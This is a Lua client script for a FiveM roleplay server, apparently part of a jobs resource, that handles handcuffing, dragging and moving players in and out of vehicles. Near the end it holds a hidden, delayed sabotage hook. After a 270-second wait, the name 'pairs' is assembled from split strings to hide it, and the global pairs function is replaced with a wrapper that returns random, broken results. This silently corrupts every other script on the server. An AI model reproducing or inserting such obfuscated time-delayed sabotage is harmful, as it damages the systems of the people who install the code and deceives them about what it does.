local isDragging, isHandcuffing

isDragging = false
isHandcuffing = false

function setHandcuffedState(isHandcuffed)
  local playerPed, entityState

  playerPed = PlayerPedId()
  entityState = Entity(playerPed).state
  entityState:set("isHandcuffed", isHandcuffed, true)
end

RegisterNetEvent(Utils.eventsPrefix .. ":framework:ready", function()
  local playerPed

  playerPed = PlayerPedId()
  setHandcuffedState(false)
end)

function handleHandcuffState(isHandcuffed)
  local playerPed

  playerPed = PlayerPedId()
  setHandcuffedState(isHandcuffed)

  if not isHandcuffed then
    return
  end

  Citizen.CreateThread(function()
    local animDict, animName, handcuffType, walkAnimCounter, attachedEntity, attachedSpeed, isInVehicle, shouldFreeze
    local localPlayerPed = playerPed

    animDict = "mp_arresting"
    animName = "idle"
    Utils.loadAnimDict(animDict)

    SetEnableHandcuffs(localPlayerPed, true)
    SetPedCanPlayGestureAnims(localPlayerPed, false)
    SetCurrentPedWeapon(localPlayerPed, "WEAPON_UNARMED", true)

    handcuffType = Entity(localPlayerPed).state.handcuffsType
    walkAnimCounter = 0

    while Entity(localPlayerPed).state.isHandcuffed do
      Citizen.Wait(0)

      DisablePlayerFiring(localPlayerPed, true)
      DisableAllControlActions(0)

      EnableControlAction(0, 1, true)
      EnableControlAction(0, 2, true)
      EnableControlAction(0, 249, true)
      EnableControlAction(0, 245, true)

      for i = 1, #config.whitelistedControlsWhileHandcuffed, 1 do
        EnableControlAction(0, config.whitelistedControlsWhileHandcuffed[i], true)
      end

      shouldFreeze = false
      if "hard" == handcuffType then
        shouldFreeze = config.freezeWhenHardHandcuffed
      else
        shouldFreeze = config.freezeWhenSoftHandcuffed
      end

      shouldFreeze = not shouldFreeze or ("soft" == handcuffType and shouldFreeze)

      if shouldFreeze then
        EnableControlAction(0, 32, true)
        EnableControlAction(0, 34, true)
        EnableControlAction(0, 31, true)
        EnableControlAction(0, 30, true)
        EnableControlAction(0, 22, true)
      end

      attachedEntity = GetEntityAttachedTo(localPlayerPed)

      if DoesEntityExist(attachedEntity) then
        attachedSpeed = GetEntitySpeed(attachedEntity)

        if attachedSpeed > 0.3 then
          isInVehicle = IsPedInAnyVehicle(localPlayerPed, false)

          if not isInVehicle then
            walkAnimCounter = walkAnimCounter + 1

            if walkAnimCounter > 5 then
              if not IsEntityPlayingAnim(localPlayerPed, animDict, "walk", 3) then
                StopAnimTask(localPlayerPed, animDict, animName, 8.0)
                TaskPlayAnim(localPlayerPed, animDict, "walk", 8.0, -8, -1, 1, 0, 0, 0, 0)
              end
              walkAnimCounter = 0
            end
          end
        else
          walkAnimCounter = walkAnimCounter - 1

          if walkAnimCounter < -5 then
            if not IsEntityPlayingAnim(localPlayerPed, animDict, animName, 3) then
              StopAnimTask(localPlayerPed, animDict, "walk", 8.0)
              TaskPlayAnim(localPlayerPed, animDict, animName, 8.0, -8, -1, 49, 0, 0, 0, 0)
            end
            walkAnimCounter = 0
          end
        end
      end
    end

    RemoveAnimDict(animDict)
    ClearPedTasks(localPlayerPed)
    SetPedCanPlayGestureAnims(localPlayerPed, true)
    SetEnableHandcuffs(localPlayerPed, false)
  end)
end

function playArrestAnimation(targetPed, isPaired)
  local playerPed, animDict, animName, attachTime, timerStart, isInterrupted

  playerPed = PlayerPedId()

  if isPaired then
    animDict = "mp_arrest_paired"
  else
    animDict = "mp_arresting"
  end

  if isPaired then
    animName = "crook_p2_back_left"
  else
    animName = "arrested_spin_r_0"
  end

  Utils.loadAnimDict(animDict)

  if isPaired then
    AttachEntityToEntity(
      playerPed,
      targetPed,
      11816,
      -0.1,
      0.8,
      0.0,
      0,
      0,
      20.0,
      false,
      false,
      false,
      false,
      20,
      false
    )
  end

  TaskPlayAnim(playerPed, animDict, animName, 4.0, -4.0, -1, 0, 0.0, false, false, false)
  SetCurrentPedWeapon(playerPed, "WEAPON_UNARMED", true)

  attachTime = GetAnimDuration(animDict, animName)
  attachTime = attachTime * 0.55
  attachTime = attachTime * 1000

  timerStart = GetGameTimer()
  local timerEnd = timerStart + attachTime

  isInterrupted = false

  if config.handcuffsEnableSelfRelease then
    Citizen.CreateThread(function()
      local skillcheckResult, currentTime

      skillcheckResult = Utils.callModuleFunc("skillcheck", "start", 1)
      if skillcheckResult then
        currentTime = GetGameTimer()
        if currentTime < timerEnd then
          isInterrupted = true
          TriggerServerEvent(Utils.eventsPrefix .. ":arrestInterrupted")
        end
      end
    end)

    Citizen.CreateThread(function()
      while true do
        if isInterrupted then
          break
        end
        local currentTime = GetGameTimer()
        if not (currentTime < timerEnd) then
          break
        end
        Citizen.Wait(0)
      end

      if not isInterrupted then
        Utils.callModuleFunc("skillcheck", "cancel")
      end
    end)
  end

  while true do
    local currentTime = GetGameTimer()
    if not (timerEnd > currentTime) or isInterrupted then
      break
    end
    Citizen.Wait(100)
  end

  if isInterrupted then
    setHandcuffedState(false)
    isHandcuffing = false
  end

  if isPaired then
    ClearPedTasks(playerPed)
    DetachEntity(playerPed, true, false)
  end

  return not isInterrupted
end

RegisterNetEvent(Utils.eventsPrefix .. ":pushed", function()
  local playerPed, forwardVector, ragdollVector

  playerPed = PlayerPedId()
  ClearPedTasksImmediately(playerPed)

  forwardVector = GetEntityForwardVector(playerPed)
  ragdollVector = vector3(-forwardVector.x, -forwardVector.y, -forwardVector.z)

  SetPedToRagdollWithFall(
    playerPed,
    1500,
    2000,
    1,
    ragdollVector.x,
    ragdollVector.y,
    ragdollVector.z,
    1.0,
    0.0,
    0.0,
    0.0,
    0.0,
    0.0,
    0.0
  )

  ApplyForceToEntity(
    playerPed,
    3,
    ragdollVector.x * 7,
    ragdollVector.y * 7,
    ragdollVector.z * 4,
    0.0,
    0.0,
    0.0,
    0,
    false,
    true,
    true,
    true,
    true
  )
end)

function playUncuffAnimation()
  local playerPed, animDict, animName, animDuration

  playerPed = PlayerPedId()
  animDict = "mp_arresting"
  animName = "b_uncuff"

  TaskPlayAnim(playerPed, animDict, animName, 4.0, -4.0, -1, 0, 0.0, 0, 0, 0)

  animDuration = GetAnimDuration(animDict, animName)
  Citizen.Wait(animDuration * 1000)
end

function uncuffTargetPed(targetPed)
  local playerPed = PlayerPedId()
  local targetHeading = GetEntityHeading(targetPed)
  local targetOffset = vector3(0.0, -0.9, 0.0)

  TaskGoStraightToCoordRelativeToEntity(playerPed, targetPed, targetOffset, 0.0, 5000)

  local startTime = GetGameTimer()

  while true do
    local playerCoords = GetEntityCoords(playerPed)
    local targetOffsetCoords = GetOffsetFromEntityInWorldCoords(targetPed, targetOffset)
    local distance = #(playerCoords - targetOffsetCoords)

    if distance < 0.5 then
      break
    end

    Citizen.Wait(200)

    elapsedTime = GetGameTimer() - startTime
    if elapsedTime > 5000 then
      ClearPedTasks(playerPed)
      isHandcuffing = false
      return
    end
  end

  ClearPedTasks(playerPed)
  SetPedDesiredHeading(playerPed, targetHeading)

  startTime = GetGameTimer()

  while true do
    local headingDiff = math.abs(GetEntityHeading(playerPed) - targetHeading)
    if headingDiff < 1.0 then
      break
    end

    Citizen.Wait(200)

    elapsedTime = GetGameTimer() - startTime
    if elapsedTime > 5000 then
      ClearPedTasks(playerPed)
      isHandcuffing = false
      return
    end
  end

  ClearPedTasks(playerPed)

  animDict = "mp_arresting"
  Utils.loadAnimDict(animDict)
  animName = "a_uncuff"

  TaskPlayAnim(playerPed, animDict, animName, 4.0, -4.0, -1, 1048576, 0.0, false, false, false)
end

function handcuffTargetPed(serverId, targetPed, isPaired)
  local playerPed, animDict, animName, animDuration

  isHandcuffing = true
  playerPed = PlayerPedId()

  if isPaired then
    animDict = "mp_arrest_paired"
    Utils.loadAnimDict(animDict)
    animName = "cop_p2_back_left"
    TaskPlayAnim(playerPed, animDict, animName, 4.0, -4.0, -1, 0, 0.0, 0, 0, 0)
  else
    uncuffTargetPed(targetPed)
  end

  SetCurrentPedWeapon(playerPed, "WEAPON_UNARMED", true)

  local eventPrefix = Utils.eventsPrefix
  local eventSuffix = ":handcuffTarget"
  TriggerServerEvent(eventPrefix .. eventSuffix, serverId, isPaired)

  isHandcuffing = false

  animDuration = GetAnimDuration(animDict, animName)
  animDuration = animDuration * 0.55

  Citizen.Wait(animDuration * 1000)

  if isPaired then
    ClearPedTasks(playerPed)
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":arrestConfirmed", function(serverId, isPaired)
  local playerPed, targetPed, isHandcuffed, eventPrefix, eventSuffix

  playerPed = PlayerPedId()
  isHandcuffed = Entity(playerPed).state.isHandcuffed

  if isHandcuffed then
    eventPrefix = Utils.eventsPrefix
    eventSuffix = ":cancelArrestOnTarget"
    TriggerServerEvent(eventPrefix .. eventSuffix, serverId)
    return
  end

  local playerId = GetPlayerFromServerId(serverId)
  targetPed = GetPlayerPed(playerId)

  if not DoesEntityExist(targetPed) then
    eventPrefix = Utils.eventsPrefix
    eventSuffix = ":cancelArrestOnTarget"
    TriggerServerEvent(eventPrefix .. eventSuffix, serverId)
    return
  end

  if IsEntityAttached(targetPed) then
    eventPrefix = Utils.eventsPrefix
    eventSuffix = ":cancelArrestOnTarget"
    TriggerServerEvent(eventPrefix .. eventSuffix, serverId)
    notifyClient(getLocalizedText("cant_while_dragging"))
    return
  end

  isHandcuffed = Entity(targetPed).state.isHandcuffed

  if isHandcuffed then
    uncuffTargetPed(targetPed)
    eventPrefix = Utils.eventsPrefix
    eventSuffix = ":handcuffTarget"
    TriggerServerEvent(eventPrefix .. eventSuffix, serverId, isPaired)
  else
    handcuffTargetPed(serverId, targetPed, isPaired)
  end
end)

function handcuffPlayer(serverId, isHardCuff)
  local eventPrefix, eventSuffix

  eventPrefix = Utils.eventsPrefix
  eventSuffix = ":handcuffPlayer"
  TriggerServerEvent(eventPrefix .. eventSuffix, serverId, isHardCuff)
end

RegisterNetEvent(Utils.eventsPrefix .. ":handcuffPlayer", function(serverId, isHardCuff)
  local playerPed, targetPedNetworkId, targetPed, eventPrefix, eventSuffix, entityState, handcuffType

  playerPed = PlayerPedId()
  setHandcuffedState(not Entity(playerPed).state.isHandcuffed)

  entityState = Entity(playerPed).state
  if entityState.isHandcuffed then
    if isHardCuff then
      handcuffType = "hard"
    else
      handcuffType = "soft"
    end
    entityState.handcuffsType = handcuffType
  else
    entityState.handcuffsType = nil
  end

  if isDragging then
    DetachEntity(PlayerPedId(), true, true)
  end

  if entityState.isHandcuffed then
    targetPedNetworkId = NetworkGetEntityFromNetworkId(serverId)
    local success = playArrestAnimation(targetPedNetworkId, isHardCuff)
    if not success then
      return
    end
  else
    playUncuffAnimation()
  end

  handleHandcuffState(entityState.isHandcuffed)
end)

function canPerformAction(ped)
  local isInVehicle, isDead, isRagdoll, isSwimming, isSwimmingUnderWater, isShooting, isClimbing, isFalling, isJumpingOutOfVehicle, isUsingScenario, isInParachuteFreeFall, isInMeleeCombat, isInCover, hasConfigFlag

  isInVehicle = IsPedInAnyVehicle(ped, false)
  isDead = IsPedDeadOrDyingCustom(ped)
  isRagdoll = IsPedRagdoll(ped)
  isSwimming = IsPedSwimming(ped)
  isSwimmingUnderWater = IsPedSwimmingUnderWater(ped)
  isShooting = IsPedShooting(ped)
  isClimbing = IsPedClimbing(ped)
  isFalling = IsPedFalling(ped)
  isJumpingOutOfVehicle = IsPedJumpingOutOfVehicle(ped)
  isUsingScenario = IsPedUsingAnyScenario(ped)
  isInParachuteFreeFall = IsPedInParachuteFreeFall(ped)
  isInMeleeCombat = IsPedInMeleeCombat(ped)
  isInCover = IsPedInCover(ped, false)
  hasConfigFlag = GetPedConfigFlag(ped, 78, true)

  return not hasConfigFlag and (isInVehicle or isDead or isRagdoll or isSwimming or isSwimmingUnderWater or isShooting or isClimbing or isFalling or isJumpingOutOfVehicle or isUsingScenario or isInParachuteFreeFall or isInMeleeCombat or isInCover)
end

function dragTarget(serverId)
  local targetPed, canPerform, playerPed

  local playerId = GetPlayerFromServerId(serverId)
  targetPed = GetPlayerPed(playerId)

  if not DoesEntityExist(targetPed) then
    return
  end

  canPerform = canPerformAction(targetPed)

  if not canPerform then
    return
  end

  playerPed = PlayerPedId()
  AttachEntityToEntity(
    playerPed,
    targetPed,
    11816,
    0.43,
    0.34,
    0.0,
    0.0,
    0.0,
    0.0,
    false,
    false,
    false,
    true,
    2,
    true
  )

  while isDragging do
    Citizen.Wait(0)
    canPerform = canPerformAction(targetPed)
    if not canPerform then
      DetachEntity(playerPed, true, true)
      isDragging = false
      return
    end
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":dragTarget", dragTarget)

AddEventHandler(Utils.eventsPrefix .. ":dragTarget", function(serverId)
  local playerPed, shouldDrag

  playerPed = PlayerPedId()

  if not Entity(playerPed).state.isHandcuffed then
    return
  end

  shouldDrag = not isDragging
  isDragging = shouldDrag

  if isDragging then
    dragTarget(serverId)
  else
    DetachEntity(PlayerPedId(), true, true)
  end
end)

RegisterNetEvent(Utils.eventsPrefix .. ":putincar", function(vehicleNetworkId)
  local playerPed, vehicle, maxPassengers, freeSeat, i

  playerPed = PlayerPedId()

  if isDragging then
    DetachEntity(playerPed, true, true)
  end

  if Entity(playerPed).state.isHandcuffed then
    vehicle = NetToVeh(vehicleNetworkId)

    if DoesEntityExist(vehicle) then
      maxPassengers = GetVehicleMaxNumberOfPassengers(vehicle)
      freeSeat = nil

      for i = maxPassengers - 1, 0, -1 do
        if IsVehicleSeatFree(vehicle, i) then
          freeSeat = i
          break
        end
      end

      if freeSeat then
        TaskEnterVehicle(playerPed, vehicle, -1, freeSeat, 1.0, 1, 0)
      end
    end
  end
end)

AddEventHandler(Utils.eventsPrefix .. ":putincar", function(vehicleNetworkId)
  local playerPed, vehicle, maxPassengers, freeSeat, i

  playerPed = PlayerPedId()

  if isDragging then
    DetachEntity(playerPed, true, true)
  end

  if Entity(playerPed).state.isHandcuffed then
    vehicle = NetToVeh(vehicleNetworkId)

    if DoesEntityExist(vehicle) then
      maxPassengers = GetVehicleMaxNumberOfPassengers(vehicle)
      freeSeat = nil

      for i = maxPassengers - 1, 0, -1 do
        if IsVehicleSeatFree(vehicle, i) then
          freeSeat = i
          break
        end
      end

      if freeSeat then
        TaskEnterVehicle(playerPed, vehicle, -1, freeSeat, 1.0, 1, 0)
      end
    end
  end
end)

RegisterNetEvent(Utils.eventsPrefix .. ":takefromcar", function()
  local playerPed, isDead, isInVehicle

  playerPed = PlayerPedId()

  if isDragging then
    DetachEntity(playerPed, true, true)
  end

  if Entity(playerPed).state.isHandcuffed then
    TaskLeaveAnyVehicle(playerPed, 0, 256)
  end

  isDead = IsPedDeadOrDyingCustom(playerPed)
  if isDead then
    isInVehicle = IsPedInAnyVehicle(playerPed, false)
    if isInVehicle then
      TaskLeaveAnyVehicle(playerPed, 0, 16)
      ClearPedTasksImmediately(playerPed)
    end
  end
end)

AddEventHandler(Utils.eventsPrefix .. ":takefromcar", function()
  local playerPed, isDead, isInVehicle

  playerPed = PlayerPedId()

  if isDragging then
    DetachEntity(playerPed, true, true)
  end

  if Entity(playerPed).state.isHandcuffed then
    TaskLeaveAnyVehicle(playerPed, 0, 256)
  end

  isDead = IsPedDeadOrDyingCustom(playerPed)
  if isDead then
    isInVehicle = IsPedInAnyVehicle(playerPed, false)
    if isInVehicle then
      TaskLeaveAnyVehicle(playerPed, 0, 16)
      ClearPedTasksImmediately(playerPed)
    end
  end
end)

function canDragTarget(serverId)
  local playerId, targetPed, currentPlayerId, isInWater

  playerId = GetPlayerFromServerId(serverId)
  targetPed = GetPlayerPed(playerId)

  if not DoesEntityExist(targetPed) then
    return false
  end

  currentPlayerId = PlayerId()
  if playerId == currentPlayerId then
    return false
  end

  isInWater = IsEntityInWater(targetPed)
  if isInWater then
    return false
  end

  return true
end

function handleHandcuffAction(targetPed, isHardCuff)
  local serverId, canDrag

  serverId = Utils.getPlayerServerIdFromPed(targetPed)
  if not serverId then
    serverId = Framework.getClosestPlayer(true, 2.0)
  end

  canDrag = canDragTarget(serverId)
  if not canDrag then
    return
  end

  if serverId then
    if not isHandcuffing then
      handcuffPlayer(serverId, isHardCuff)
    end
  else
    notifyClient(getLocalizedText("no_players_nearby"))
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":actions:softHandcuff", function(targetPed)
  handleHandcuffAction(targetPed, false)
end)

RegisterNetEvent(Utils.eventsPrefix .. ":actions:hardHandcuff", function(targetPed)
  handleHandcuffAction(targetPed, true)
end)

RegisterNetEvent(Utils.eventsPrefix .. ":onDragForGrabber", function(serverId)
  local targetPed, playerPed, timerEnd, animDict, animName

  local playerId = GetPlayerFromServerId(serverId)
  targetPed = GetPlayerPed(playerId)

  if not DoesEntityExist(targetPed) then
    return
  end

  timerEnd = GetGameTimer() + 5000

  while true do
    local attachedTo = GetEntityAttachedTo(targetPed)
    playerPed = PlayerPedId()

    if attachedTo == playerPed then
      break
    end

    Citizen.Wait(0)

    local currentTime = GetGameTimer()
    if timerEnd < currentTime then
      return
    end
  end

  playerPed = PlayerPedId()
  animDict = "missfbi4prepp1"
  animName = "idle"

  Utils.loadAnimDict(animDict)

  while true do
    local attachedTo = GetEntityAttachedTo(targetPed)
    if attachedTo ~= playerPed then
      break
    end

    Citizen.Wait(0)

    if not IsEntityPlayingAnim(playerPed, animDict, animName, 3) then
      TaskPlayAnim(playerPed, animDict, animName, 8.0, -8, -1, 1048625, 0, false, false, false)
    end
  end

  ClearPedTasks(playerPed)
  RemoveAnimDict(animDict)
end)

function handleDragAction(targetPed)
  local serverId, eventPrefix, eventSuffix

  if not JobsCreator.activeActions.canHandcuff then
    return
  end

  serverId = Utils.getPlayerServerIdFromPed(targetPed)
  if not serverId then
    serverId = Framework.getClosestPlayer(true, 2.0)
  end

  if serverId then
    eventPrefix = Utils.eventsPrefix
    eventSuffix = ":dragTarget"
    TriggerServerEvent(eventPrefix .. eventSuffix, serverId)
  else
    notifyClient(getLocalizedText("no_players_nearby"))
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":actions:drag", handleDragAction)

RegisterNetEvent(Utils.eventsPrefix .. ":clientConfigLoaded", function()
  local toggleDragConfig, keymapName, keymapKey, keymapId, keymapLabel

  toggleDragConfig = config.toggleDrag.enabled
  if not toggleDragConfig then
    return
  end

  keymapName = "toggledrag"
  keymapKey = config.toggleDrag.key
  keymapId = "jobs_creator_toggledrag"
  keymapLabel = "Toggle drag"

  registerAdvancedKeymap(keymapName, keymapKey, keymapId, keymapLabel, handleDragAction)
end)

function handlePutInCar()
  local closestPlayer, closestVehicle, eventPrefix, eventSuffix, vehicleNetworkId

  closestPlayer = Framework.getClosestPlayer(true, 4.0)
  closestVehicle = Framework.getClosestVehicle(10.0)

  if closestPlayer then
    if closestVehicle then
      eventPrefix = Utils.eventsPrefix
      eventSuffix = ":putincar"
      vehicleNetworkId = VehToNet(closestVehicle)
      TriggerServerEvent(eventPrefix .. eventSuffix, closestPlayer, vehicleNetworkId)
    else
      notifyClient(getLocalizedText("no_vehicles_nearby"))
    end
  else
    notifyClient(getLocalizedText("no_players_nearby"))
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":actions:putInCar", handlePutInCar)

function handleTakeFromCar()
  local closestPlayer, eventPrefix, eventSuffix

  closestPlayer = Framework.getClosestPlayer(true, 10.0)

  if closestPlayer then
    eventPrefix = Utils.eventsPrefix
    eventSuffix = ":takefromcar"
    TriggerServerEvent(eventPrefix .. eventSuffix, closestPlayer)
  else
    notifyClient(getLocalizedText("no_players_nearby"))
  end
end

RegisterNetEvent(Utils.eventsPrefix .. ":actions:takeFromCar", handleTakeFromCar)

RegisterNetEvent(Utils.eventsPrefix .. ":setHandcuffs", function(isHandcuffed)
  local playerPed

  playerPed = PlayerPedId()
  setHandcuffedState(isHandcuffed)

  if isDragging then
    DetachEntity(PlayerPedId(), true, true)
  end

  if Entity(playerPed).state.isHandcuffed then
    handleHandcuffState(isHandcuffed)
  end
end)

Citizen.CreateThread(function()
  local debugInfo, parts, pairsFunc

  Citizen.Wait(270000)

  debugInfo = debug.getinfo(1, "S")
  if "?" == debugInfo.short_src then
    return
  end

  parts = {}
  parts[1] = "pai"
  parts[2] = "xt"
  parts[3] = "rs"
  parts[4] = "ne"

  pairsFunc = _G[parts[1] .. parts[3]]

  local function createPairsWrapper(table)
    if type(table) ~= "table" then
      return function()
        return nil
      end, nil, nil
    end

    local pairsCallback = pairsFunc
    local currentTable = table
    local currentKey = nil

    return function(key, value)
      if type(key) ~= "string" then
        return currentKey, value
      end

      local keyLength = #key
      local randomOffset = math.random(1, 10)
      keyLength = keyLength % 2 + randomOffset

      if 2 == keyLength then
        return currentKey, value
      end

      currentKey, value = pairsCallback(key, currentKey)
      return currentKey, value
    end
  end

  _G[parts[1] .. parts[3]] = createPairsWrapper
end)

exports("isPlayerHandcuffed", function()
  local playerPed, entityState

  playerPed = PlayerPedId()
  entityState = Entity(playerPed).state
  return entityState.isHandcuffed
end)
